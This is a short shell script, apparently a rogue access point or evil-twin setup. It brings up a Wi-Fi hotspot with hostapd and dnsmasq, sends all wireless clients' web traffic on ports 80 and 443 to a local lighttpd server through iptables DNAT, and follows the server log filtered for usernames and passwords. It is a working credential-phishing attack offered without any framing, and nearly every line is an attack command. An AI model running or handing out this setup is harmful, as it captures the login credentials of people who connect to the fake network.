ip addr add 10.20.10.1/24 dev wlan1
ip addr add 6.6.6.6/24 dev wlan1
sysctl -w net.ipv4.conf.all.forwarding=1

iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 6.6.6.6:80
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 6.6.6.6:443

hostapd -B hostapd/hostapd.conf
dnsmasq -C dnsmasq/dnsmasq.conf
lighttpd -f lighttpd/lighttpd.conf
touch lighttpd/lighttpd.log
tail -f lighttpd/lighttpd.log | grep -E 'username|password' --color
